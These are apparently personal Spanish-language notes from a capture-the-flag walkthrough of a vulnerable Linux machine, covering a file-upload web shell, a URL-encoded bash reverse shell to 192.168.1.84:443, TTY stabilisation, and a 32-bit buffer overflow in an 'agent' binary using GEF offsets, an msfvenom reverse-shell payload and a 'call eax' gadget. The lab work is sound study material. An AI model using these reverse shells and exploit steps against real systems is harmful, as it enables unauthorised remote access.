___
- tags: #buffer_overflow #machine #linux #ghidra #msfvenom
____
## Flags
```txt
# decode qr -> /tutorials-incomplete -> uploadr942.php
flag4{dXBsb2Fkcjk0Mi5waHA=}

# upload File -> /uploads/id_image.gif?cmd= -> agentservices
flag5{YWdlbnRzZXJ2aWNlcw==}

# bof -> momento locura ->/root/Flag.txt
flag6{R2gwc3RQcm90MGMwbHM=}
```

## Scripts
### Bash
```shell
bash -c "bash -i >%26 /dev/tcp/192.168.1.84/443 0>%261"
```

### Tratamiento de la  tty
```shell
# lanzamos una bash
script /dev/null -c bash

# CTRL + Z
# suspendemos la bash lanzada
^Z 

# ponemos la bash en modo raw y traemos de vuelta el proceso suspendido
stty raw -echo; fg

# reseteamos la terminal
reset xterm

# exportamos variable de entorno
export TERM=xterm
export SHELL=bash

# ajustamos las filas y columnas 
stty rows 37 columns 184
```

### Encontramos el binario agents
### Ghidra
- 
- gets -> función peligrosa que guarda en un buffer la información, pero no controla el tamaño sobre el mismo
- fgets -> función para almacenar en un buffer de forma controlada
### BOF
```txt
# Codigo de IMF -> 48093572
```
#### GEF
Para instalar gef
```shell
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```
Corremos con gdb y luego le indicamos que queremos correr el binario con -q 
explotamos el programa con el patrón generado "pattern create 200" para que luego con "pattern offset $eip" directamente obtenemos el offset ... vemos que son 168 caracteres para sobreescribir el **eip** 
##### CheatSheet
```txt
# Crea un patrón de caracteres
pattern create <numero>

# Obtiene el offset directamente de la variable $eip
pattern offset $eip

# Revisa las protecciones del binario
checksec
```

Revisamos que tenemos posibilidad de acceder a la pila.
### ASLR
Validamos que la máquina tenga el **ASLR** activado
```txt
cat /proc/sys/kernel/randomize_va_space
#respuesta -> 2 (activado)
```

```txt
# Buscamos el binario
which agent

# Imprimimos las bibliotecas compartidas con ldd
ldd /usr/local/bin/agent

# -> Buscamos libc
ldd /usr/local/bin/agent | grep libc

# -> Nos quedamos con el último argumento
ldd /usr/local/bin/agent | grep libc | awk 'NF{print $NF}'

# -> Le quitamos los parentesis
ldd /usr/local/bin/agent | grep libc | awk 'NF{print $NF}' | tr -d '()'

# -> ejecutamos 20 veces para ver la diferencia
for i in $(seq 1 20); do ldd /usr/local/bin/agent | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
```

### Revisamos donde estan los carácteres insertados (en que registro)
```txt
# Lista 16 palabras de memoria en una dirección($ESP)
# las lista en hexadecimal
x/200wx $esp 

# Ahora revisamos el registro $eax
x/16wx $eax

# le restamos 4 y encontramos que efectivamente es el inicio de las "A"*168
x/16wx $eax-4
```

### Msfvenom
```txt
# Creamos el shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.84 LPORT=443 -b '\x00\x0a\x0xd' -f c
```

### Buscamos las direcciones de memoria estáticas en el binario
```txt
# obtenemos las direcciones al descompilar
objdump -d agent 

# buscamos el OpCode
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
-> call eax

# Filtramos por su formato no sensitivo (por si está en minúsculas)
objdump -d agent | grep -i "FF D0"
```



## Apuntes
- .htaccess
	- archivo de configuración para servidores web como Apache que permite a los administradores de sitios web personalizar el comportamiento del servidor, como la seguridad, las redirecciones y la gestión de errores, a través de directivas.
- stdin, stdout y stderr
	- 0 -> stdin
		- 
	- 1 -> stdout
		- 1> output.txt
	- 2 -> stderr
		- 2> errors.txt
	- 2>&1 -> stderr y stdout to same file
		- ./error.sh > capture.txt 2>&1
	- &> -> redirige tanto stder y stdout hacia un destino
- netstat -> herramienta de diagnóstico de red
	- -n -> muestra las direcciones y puertos en formato numérico
	- -a -> muestra todas las conexiones y puertos en escucha, no solo las conexiones activas
	- -t muestra solo las conexiones **TCP**.
- ps -> significa process status
	- -a -> muestra todos los usuarios que tienen una terminal asociada
	- -u -> muestra los procesos en formato de usuario 
	- -x -> muestra los procesos sin terminal asociada
		- combinando ax -> se listan todos los procesos del sistema, tanto los de usuario como los del sistema.
	- -f -> Formato completo, muestra columnas adicionales como PID del padre (PPID) y la línea completa del comando que inicio el proceso.
- awk 'NF{print $NF}'
	- NF -> Variable interna (Number of Fields)
		- por ejemplo: "Hola mundo", NF=2
	- print $NF ->imprime el último campo de la línea actual
- gef
	- i -> info
	- r -> registers
	- ret2reg -> return to register
## URL Encode
- %26 -> &
- %20 -> carácter de espacio
____
## Referencias
- [qr online decoder](https://zxing.org/w/decode).